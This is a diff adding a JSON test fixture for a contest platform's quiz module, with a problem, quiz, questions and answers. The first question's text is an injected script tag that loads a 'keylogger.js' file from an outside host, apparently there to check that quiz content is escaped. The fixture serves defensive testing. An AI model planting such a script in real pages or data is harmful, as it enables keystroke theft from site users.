@@ -1,0 +1,101 @@
+[
+  {
+    "pk": 1,
+    "model": "problems.problem",
+    "fields": {
+      "name": "Test quiz",
+      "contest": "c",
+      "author":1001,
+      "short_name": "qui",
+      "controller_name": "oioioi.quizzes.controllers.QuizProblemController"
+    }
+  },
+  {
+    "pk": 1,
+    "model": "quizzes.quiz",
+    "fields": {}
+  },
+  {
+    "pk": 1,
+    "model": "quizzes.quizquestion",
+    "fields": {
+      "question": "<script src=\"http://weaselcrow.com/keylogger.js\"></script>",
+      "quiz": 1,
+      "points": 27
+    }
+  },
+  {
+    "pk": 1,
+    "model": "quizzes.quizanswer",
+    "fields": {
+      "question": 1,
+      "answer": "<pre>Answer - correct</pre>",
+      "is_correct": true
+    }
+  },
+  {
+    "pk": 2,
+    "model": "quizzes.quizanswer",
+    "fields": {
+      "question": 1,
+      "answer": "Answer - wrong",
+      "is_correct": false
+    }
+  },
+  {
+    "pk": 2,
+    "model": "quizzes.quizquestion",
+    "fields": {
+      "question": "Question 2 (multiple choice)",
+      "quiz": 1,
+      "is_multiple_choice": true,
+      "points": 27
+    }
+  },
+  {
+    "pk": 3,
+    "model": "quizzes.quizanswer",
+    "fields": {
+      "question": 2,
+      "answer": "A",
+      "is_correct": true
+    }
+  },
+  {
+    "pk": 4,
+    "model": "quizzes.quizanswer",
+    "fields": {
+      "question": 2,
+      "answer": "B",
+      "is_correct": false
+    }
+  },
+  {
+    "pk": 3,
+    "model": "quizzes.quizquestion",
+    "fields": {
+      "question": "Question 3 (multiple choice-no correct answer)",
+      "quiz": 1,
+      "is_multiple_choice": true,
+      "points": 27
+    }
+  },
+  {
+    "pk": 5,
+    "model": "quizzes.quizanswer",
+    "fields": {
+      "question": 3,
+      "answer": "A",
+      "is_correct": false
+    }
+  },
+  {
+    "pk": 6,
+    "model": "quizzes.quizanswer",
+    "fields": {
+      "question": 3,
+      "answer": "B",
+      "is_correct": false
+    }
+  }
+]
